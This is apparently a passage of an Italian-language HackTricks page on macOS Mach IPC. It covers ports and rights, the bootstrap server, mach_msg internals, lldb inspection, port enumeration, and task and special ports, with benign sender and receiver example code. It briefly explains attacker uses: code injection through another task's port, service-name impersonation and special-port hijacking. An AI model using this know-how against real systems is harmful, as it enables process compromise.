# macOS IPC - Comunicazione tra Processi

{{#include ../../../../banners/hacktricks-training.md}}

## Messaggi Mach tramite Porte

### Informazioni di Base

Mach utilizza **compiti** come la **più piccola unità** per condividere risorse, e ogni compito può contenere **più thread**. Questi **compiti e thread sono mappati 1:1 a processi e thread POSIX**.

La comunicazione tra compiti avviene tramite la Comunicazione Inter-Processo Mach (IPC), utilizzando canali di comunicazione unidirezionali. **I messaggi vengono trasferiti tra porte**, che fungono da **code di messaggi** gestite dal kernel.

Una **porta** è l'elemento **base** dell'IPC Mach. Può essere utilizzata per **inviare messaggi e riceverli**.

Ogni processo ha una **tabella IPC**, in cui è possibile trovare le **porte mach del processo**. Il nome di una porta mach è in realtà un numero (un puntatore all'oggetto kernel).

Un processo può anche inviare un nome di porta con alcuni diritti **a un compito diverso** e il kernel farà apparire questa voce nella **tabella IPC dell'altro compito**.

### Diritti di Porta

I diritti di porta, che definiscono quali operazioni un compito può eseguire, sono fondamentali per questa comunicazione. I possibili **diritti di porta** sono ([definizioni da qui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Diritto di ricezione**, che consente di ricevere messaggi inviati alla porta. Le porte Mach sono code MPSC (produttore multiplo, consumatore singolo), il che significa che può esserci solo **un diritto di ricezione per ogni porta** nell'intero sistema (a differenza delle pipe, dove più processi possono detenere descrittori di file per l'estremità di lettura di una pipe).
- Un **compito con il Diritto di Ricezione** può ricevere messaggi e **creare diritti di Invio**, consentendogli di inviare messaggi. Inizialmente solo il **proprio compito ha il Diritto di Ricezione sulla sua porta**.
- Se il proprietario del Diritto di Ricezione **muore** o lo termina, il **diritto di invio diventa inutile (nome morto)**.
- **Diritto di invio**, che consente di inviare messaggi alla porta.
- Il Diritto di invio può essere **clonato** in modo che un compito che possiede un Diritto di invio possa clonare il diritto e **concederlo a un terzo compito**.
- Si noti che i **diritti di porta** possono anche essere **trasmessi** tramite messaggi Mac.
- **Diritto di invio una sola volta**, che consente di inviare un messaggio alla porta e poi scompare.
- Questo diritto **non può** essere **clonato**, ma può essere **spostato**.
- **Diritto di insieme di porte**, che denota un _insieme di porte_ piuttosto che una singola porta. Dequeuing un messaggio da un insieme di porte dequeues un messaggio da una delle porte che contiene. Gli insiemi di porte possono essere utilizzati per ascoltare su più porte contemporaneamente, molto simile a `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Nome morto**, che non è un vero e proprio diritto di porta, ma semplicemente un segnaposto. Quando una porta viene distrutta, tutti i diritti di porta esistenti per la porta si trasformano in nomi morti.

**I compiti possono trasferire diritti di INVIO ad altri**, consentendo loro di inviare messaggi di ritorno. **I diritti di INVIO possono anche essere clonati, quindi un compito può duplicare e dare il diritto a un terzo compito**. Questo, combinato con un processo intermedio noto come **bootstrap server**, consente una comunicazione efficace tra i compiti.

### Porte di File

Le porte di file consentono di incapsulare descrittori di file in porte Mac (utilizzando diritti di porta Mach). È possibile creare un `fileport` da un FD dato utilizzando `fileport_makeport` e creare un FD da un fileport utilizzando `fileport_makefd`.

### Stabilire una comunicazione

Come accennato in precedenza, è possibile inviare diritti utilizzando messaggi Mach, tuttavia, **non puoi inviare un diritto senza già avere un diritto** per inviare un messaggio Mach. Quindi, come viene stabilita la prima comunicazione?

Per questo, il **bootstrap server** (**launchd** in mac) è coinvolto, poiché **chiunque può ottenere un diritto di INVIO al bootstrap server**, è possibile chiedergli un diritto per inviare un messaggio a un altro processo:

1. Il compito **A** crea una **nuova porta**, ottenendo il **DIRITTO DI RICEZIONE** su di essa.
2. Il compito **A**, essendo il detentore del Diritto di Ricezione, **genera un Diritto di INVIO per la porta**.
3. Il compito **A** stabilisce una **connessione** con il **bootstrap server**, e **gli invia il Diritto di INVIO** per la porta che ha generato all'inizio.
- Ricorda che chiunque può ottenere un Diritto di INVIO al bootstrap server.
4. Il compito A invia un messaggio `bootstrap_register` al bootstrap server per **associare la porta data a un nome** come `com.apple.taska`
5. Il compito **B** interagisce con il **bootstrap server** per eseguire una **ricerca bootstrap per il nome del servizio** (`bootstrap_lookup`). Affinché il bootstrap server possa rispondere, il compito B gli invierà un **Diritto di INVIO a una porta che ha precedentemente creato** all'interno del messaggio di ricerca. Se la ricerca ha successo, il **server duplica il Diritto di INVIO** ricevuto dal Compito A e **lo trasmette al Compito B**.
- Ricorda che chiunque può ottenere un Diritto di INVIO al bootstrap server.
6. Con questo Diritto di INVIO, **il Compito B** è in grado di **inviare** un **messaggio** **al Compito A**.
7. Per una comunicazione bidirezionale, di solito il compito **B** genera una nuova porta con un **DIRITTO DI RICEZIONE** e un **DIRITTO DI INVIO**, e dà il **DIRITTO DI INVIO al Compito A** in modo che possa inviare messaggi al COMPITO B (comunicazione bidirezionale).

Il bootstrap server **non può autenticare** il nome del servizio rivendicato da un compito. Ciò significa che un **compito** potrebbe potenzialmente **impersonare qualsiasi compito di sistema**, come rivendicare falsamente un nome di servizio di autorizzazione e poi approvare ogni richiesta.

Poi, Apple memorizza i **nomi dei servizi forniti dal sistema** in file di configurazione sicuri, situati in directory **protette da SIP**: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Accanto a ciascun nome di servizio, il **binario associato è anche memorizzato**. Il bootstrap server creerà e manterrà un **DIRITTO DI RICEZIONE per ciascuno di questi nomi di servizio**.

Per questi servizi predefiniti, il **processo di ricerca differisce leggermente**. Quando un nome di servizio viene cercato, launchd avvia il servizio dinamicamente. Il nuovo flusso di lavoro è il seguente:

- Il compito **B** avvia una **ricerca bootstrap** per un nome di servizio.
- **launchd** controlla se il compito è in esecuzione e, se non lo è, **lo avvia**.
- Il compito **A** (il servizio) esegue un **check-in bootstrap** (`bootstrap_check_in()`). Qui, il **bootstrap** server crea un Diritto di INVIO, lo trattiene e **trasferisce il Diritto di RICEZIONE al Compito A**.
- launchd duplica il **Diritto di INVIO e lo invia al Compito B**.
- Il compito **B** genera una nuova porta con un **DIRITTO DI RICEZIONE** e un **DIRITTO DI INVIO**, e dà il **DIRITTO DI INVIO al Compito A** (il svc) in modo che possa inviare messaggi al COMPITO B (comunicazione bidirezionale).

Tuttavia, questo processo si applica solo ai compiti di sistema predefiniti. I compiti non di sistema operano ancora come descritto originariamente, il che potrebbe potenzialmente consentire l'impersonificazione.

> [!CAUTION]
> Pertanto, launchd non dovrebbe mai bloccarsi o l'intero sistema si bloccherà.

### Un Messaggio Mach

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La funzione `mach_msg`, essenzialmente una chiamata di sistema, è utilizzata per inviare e ricevere messaggi Mach. La funzione richiede che il messaggio da inviare sia l'argomento iniziale. Questo messaggio deve iniziare con una struttura `mach_msg_header_t`, seguita dal contenuto del messaggio effettivo. La struttura è definita come segue:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
I process che possiedono un _**diritto di ricezione**_ possono ricevere messaggi su una porta Mach. Al contrario, ai **mittenti** viene concesso un _**diritto di invio**_ o un _**diritto di invio-una-volta**_. Il diritto di invio-una-volta è esclusivamente per l'invio di un singolo messaggio, dopo il quale diventa invalido.

Il campo iniziale **`msgh_bits`** è un bitmap:

- Il primo bit (il più significativo) è usato per indicare che un messaggio è complesso (ulteriori dettagli di seguito)
- Il 3° e il 4° sono utilizzati dal kernel
- I **5 bit meno significativi del 2° byte** possono essere utilizzati per **voucher**: un altro tipo di porta per inviare combinazioni chiave/valore.
- I **5 bit meno significativi del 3° byte** possono essere utilizzati per **porta locale**
- I **5 bit meno significativi del 4° byte** possono essere utilizzati per **porta remota**

I tipi che possono essere specificati nel voucher, nelle porte locali e remote sono (da [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Ad esempio, `MACH_MSG_TYPE_MAKE_SEND_ONCE` può essere utilizzato per **indicare** che un **diritto di invio una sola volta** dovrebbe essere derivato e trasferito per questa porta. Può anche essere specificato `MACH_PORT_NULL` per impedire al destinatario di poter rispondere.

Per ottenere una facile **comunicazione bidirezionale**, un processo può specificare una **porta mach** nell'**intestazione del messaggio mach** chiamata _porta di risposta_ (**`msgh_local_port`**) dove il **ricevitore** del messaggio può **inviare una risposta** a questo messaggio.

> [!TIP]
> Nota che questo tipo di comunicazione bidirezionale è utilizzato nei messaggi XPC che si aspettano una risposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Ma **di solito vengono create porte diverse** come spiegato in precedenza per creare la comunicazione bidirezionale.

Gli altri campi dell'intestazione del messaggio sono:

- `msgh_size`: la dimensione dell'intero pacchetto.
- `msgh_remote_port`: la porta sulla quale questo messaggio è inviato.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: l'ID di questo messaggio, che è interpretato dal ricevitore.

> [!CAUTION]
> Nota che **i messaggi mach vengono inviati su una `mach port`**, che è un canale di comunicazione **a singolo ricevitore**, **multi-inviatore** integrato nel kernel mach. **Più processi** possono **inviare messaggi** a una porta mach, ma in qualsiasi momento solo **un singolo processo può leggere** da essa.

I messaggi sono quindi formati dall'**intestazione `mach_msg_header_t`** seguita dal **corpo** e dal **trailer** (se presente) e possono concedere il permesso di rispondere. In questi casi, il kernel deve solo passare il messaggio da un'attività all'altra.

Un **trailer** è **informazione aggiunta al messaggio dal kernel** (non può essere impostata dall'utente) che può essere richiesta nella ricezione del messaggio con i flag `MACH_RCV_TRAILER_<trailer_opt>` (ci sono diverse informazioni che possono essere richieste).

#### Messaggi Complessi

Tuttavia, ci sono altri messaggi più **complessi**, come quelli che passano diritti di porta aggiuntivi o condividono memoria, dove il kernel deve anche inviare questi oggetti al destinatario. In questi casi, il bit più significativo dell'intestazione `msgh_bits` è impostato.

I possibili descrittori da passare sono definiti in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32 bit, tutti i descrittori sono 12B e il tipo di descrittore si trova nell'11° byte. In 64 bit, le dimensioni variano.

> [!CAUTION]
> Il kernel copierà i descrittori da un'attività all'altra ma prima **creando una copia nella memoria del kernel**. Questa tecnica, nota come "Feng Shui", è stata abusata in diversi exploit per far sì che il **kernel copi i dati nella sua memoria**, facendo in modo che un processo invii descrittori a se stesso. Poi il processo può ricevere i messaggi (il kernel li libererà).
>
> È anche possibile **inviare diritti di porta a un processo vulnerabile**, e i diritti di porta appariranno semplicemente nel processo (anche se non li sta gestendo).

### Mac Ports APIs

Nota che le porte sono associate allo spazio dei nomi del task, quindi per creare o cercare una porta, viene interrogato anche lo spazio dei nomi del task (maggiori informazioni in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Crea** una porta.
- `mach_port_allocate` può anche creare un **port set**: diritto di ricezione su un gruppo di porte. Ogni volta che viene ricevuto un messaggio, viene indicata la porta da cui proviene.
- `mach_port_allocate_name`: Cambia il nome della porta (per impostazione predefinita intero 32 bit)
- `mach_port_names`: Ottieni i nomi delle porte da un target
- `mach_port_type`: Ottieni i diritti di un task su un nome
- `mach_port_rename`: Rinomina una porta (come dup2 per i FD)
- `mach_port_allocate`: Alloca un nuovo RECEIVE, PORT_SET o DEAD_NAME
- `mach_port_insert_right`: Crea un nuovo diritto in una porta dove hai RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funzioni utilizzate per **inviare e ricevere messaggi mach**. La versione di sovrascrittura consente di specificare un buffer diverso per la ricezione del messaggio (l'altra versione riutilizzerà semplicemente quello).

### Debug mach_msg

Poiché le funzioni **`mach_msg`** e **`mach_msg_overwrite`** sono quelle utilizzate per inviare e ricevere messaggi, impostare un breakpoint su di esse consentirebbe di ispezionare i messaggi inviati e ricevuti.

Ad esempio, inizia a fare debug di qualsiasi applicazione che puoi debuggare poiché caricherà **`libSystem.B` che utilizzerà questa funzione**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Per ottenere gli argomenti di **`mach_msg`**, controlla i registri. Questi sono gli argomenti (da [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Ottieni i valori dai registri:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Ispeziona l'intestazione del messaggio controllando il primo argomento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Quel tipo di `mach_msg_bits_t` è molto comune per consentire una risposta.

### Enumerare le porte
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Il **nome** è il nome predefinito assegnato alla porta (controlla come sta **aumentando** nei primi 3 byte). L'**`ipc-object`** è l'**identificatore** unico **offuscato** della porta.\
Nota anche come le porte con solo diritti di **`send`** stanno **identificando il proprietario** (nome della porta + pid).\
Nota anche l'uso di **`+`** per indicare **altri compiti collegati alla stessa porta**.

È anche possibile utilizzare [**procesxp**](https://www.newosxbook.com/tools/procexp.html) per vedere anche i **nomi dei servizi registrati** (con SIP disabilitato a causa della necessità di `com.apple.system-task-port`):
```
procesp 1 ports
```
Puoi installare questo strumento su iOS scaricandolo da [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Esempio di codice

Nota come il **mittente** **alloca** una porta, crea un **diritto di invio** per il nome `org.darlinghq.example` e lo invia al **server di bootstrap** mentre il mittente richiede il **diritto di invio** di quel nome e lo utilizza per **inviare un messaggio**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Porte Privilegiate

Ci sono alcune porte speciali che consentono di **eseguire determinate azioni sensibili o accedere a determinati dati sensibili** nel caso in cui un'attività abbia i permessi **SEND** su di esse. Questo rende queste porte molto interessanti dal punto di vista di un attaccante non solo per le capacità, ma anche perché è possibile **condividere i permessi SEND tra le attività**.

### Porte Speciali Host

Queste porte sono rappresentate da un numero.

I diritti **SEND** possono essere ottenuti chiamando **`host_get_special_port`** e i diritti **RECEIVE** chiamando **`host_set_special_port`**. Tuttavia, entrambe le chiamate richiedono la porta **`host_priv`** a cui può accedere solo l'utente root. Inoltre, in passato, l'utente root era in grado di chiamare **`host_set_special_port`** e di dirottare arbitrariamente, il che consentiva, ad esempio, di bypassare le firme del codice dirottando `HOST_KEXTD_PORT` (SIP ora previene questo).

Queste sono divise in 2 gruppi: Le **prime 7 porte sono di proprietà del kernel**, essendo la 1 `HOST_PORT`, la 2 `HOST_PRIV_PORT`, la 3 `HOST_IO_MASTER_PORT` e la 7 è `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Quelle che iniziano **dal** numero **8** sono **di proprietà dei demoni di sistema** e possono essere trovate dichiarate in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Porte host**: Se un processo ha il privilegio **SEND** su questa porta, può ottenere **informazioni** sul **sistema** chiamando le sue routine come:
- `host_processor_info`: Ottieni informazioni sul processore
- `host_info`: Ottieni informazioni sull'host
- `host_virtual_physical_table_info`: Tabella delle pagine Virtuali/Fisiche (richiede MACH_VMDEBUG)
- `host_statistics`: Ottieni statistiche dell'host
- `mach_memory_info`: Ottieni la disposizione della memoria del kernel
- **Porte Privilege host**: Un processo con diritto **SEND** su questa porta può eseguire **azioni privilegiate** come mostrare i dati di avvio o tentare di caricare un'estensione del kernel. Il **processo deve essere root** per ottenere questo permesso.
- Inoltre, per chiamare l'API **`kext_request`** è necessario avere altri diritti **`com.apple.private.kext*`** che sono concessi solo ai binari Apple.
- Altre routine che possono essere chiamate sono:
- `host_get_boot_info`: Ottieni `machine_boot_info()`
- `host_priv_statistics`: Ottieni statistiche privilegiate
- `vm_allocate_cpm`: Alloca memoria fisica contigua
- `host_processors`: Diritto di invio ai processori host
- `mach_vm_wire`: Rendi la memoria residente
- Poiché **root** può accedere a questo permesso, potrebbe chiamare `host_set_[special/exception]_port[s]` per **dirottare porte speciali o di eccezione host**.

È possibile **vedere tutte le porte speciali host** eseguendo:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Questi sono porte riservate per servizi ben noti. È possibile ottenerle/impostarle chiamando `task_[get/set]_special_port`. Possono essere trovate in `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Da [qui](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[diritto di invio task-self]: La porta utilizzata per controllare questo task. Usata per inviare messaggi che influenzano il task. Questa è la porta restituita da **mach_task_self (vedi Task Ports qui sotto)**.
- **TASK_BOOTSTRAP_PORT**\[diritto di invio bootstrap]: La porta di bootstrap del task. Usata per inviare messaggi che richiedono il ritorno di altre porte di servizio di sistema.
- **TASK_HOST_NAME_PORT**\[diritto di invio host-self]: La porta utilizzata per richiedere informazioni sull'host contenitore. Questa è la porta restituita da **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[diritto di invio ledger]: La porta che nomina la sorgente da cui questo task attinge la sua memoria kernel wired.
- **TASK_PAGED_LEDGER_PORT**\[diritto di invio ledger]: La porta che nomina la sorgente da cui questo task attinge la sua memoria gestita predefinita.

### Task Ports

Originariamente Mach non aveva "processi", aveva "task" che erano considerati più come un contenitore di thread. Quando Mach è stato fuso con BSD **ogni task era correlato a un processo BSD**. Pertanto, ogni processo BSD ha i dettagli necessari per essere un processo e ogni task Mach ha anche il suo funzionamento interno (eccetto per il pid 0 inesistente che è il `kernel_task`).

Ci sono due funzioni molto interessanti relative a questo:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Ottieni un diritto di INVIO per la porta del task relativo a quello specificato dal `pid` e assegnalo alla `target_task_port` indicata (che è solitamente il task chiamante che ha usato `mach_task_self()`, ma potrebbe essere una porta di INVIO su un task diverso).
- `pid_for_task(task, &pid)`: Dato un diritto di INVIO a un task, trova a quale PID questo task è correlato.

Per eseguire azioni all'interno del task, il task aveva bisogno di un diritto di `SEND` su se stesso chiamando `mach_task_self()` (che utilizza il `task_self_trap` (28)). Con questo permesso un task può eseguire diverse azioni come:

- `task_threads`: Ottieni il diritto di INVIO su tutte le porte del task dei thread del task
- `task_info`: Ottieni informazioni su un task
- `task_suspend/resume`: Sospendi o riprendi un task
- `task_[get/set]_special_port`
- `thread_create`: Crea un thread
- `task_[get/set]_state`: Controlla lo stato del task
- e altro può essere trovato in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Nota che con un diritto di INVIO su una porta task di un **task diverso**, è possibile eseguire tali azioni su un task diverso.

Inoltre, la task_port è anche la porta **`vm_map`** che consente di **leggere e manipolare la memoria** all'interno di un task con funzioni come `vm_read()` e `vm_write()`. Questo significa fondamentalmente che un task con diritti di INVIO sulla task_port di un task diverso sarà in grado di **iniettare codice in quel task**.

Ricorda che poiché il **kernel è anche un task**, se qualcuno riesce a ottenere un **diritto di INVIO** sul **`kernel_task`**, sarà in grado di far eseguire al kernel qualsiasi cosa (jailbreak).

- Chiama `mach_task_self()` per **ottenere il nome** per questa porta per il task chiamante. Questa porta è solo **ereditata** attraverso **`exec()`**; un nuovo task creato con `fork()` ottiene una nuova porta task (come caso speciale, un task ottiene anche una nuova porta task dopo `exec()` in un binario suid). L'unico modo per generare un task e ottenere la sua porta è eseguire il ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) mentre si esegue un `fork()`.
- Queste sono le restrizioni per accedere alla porta (da `macos_task_policy` dal binario `AppleMobileFileIntegrity`):
- Se l'app ha l'**entitlement `com.apple.security.get-task-allow`**, i processi dello **stesso utente possono accedere alla porta task** (comunemente aggiunto da Xcode per il debug). Il processo di **notarizzazione** non lo consentirà per le versioni di produzione.
- Le app con l'**entitlement `com.apple.system-task-ports`** possono ottenere la **porta task per qualsiasi** processo, tranne il kernel. Nelle versioni precedenti era chiamato **`task_for_pid-allow`**. Questo è concesso solo alle applicazioni Apple.
- **Root può accedere alle porte task** delle applicazioni **non** compilate con un runtime **indurito** (e non da Apple).

**La porta del nome del task:** Una versione non privilegiata della _porta task_. Riferisce al task, ma non consente di controllarlo. L'unica cosa che sembra essere disponibile attraverso di essa è `task_info()`.

### Thread Ports

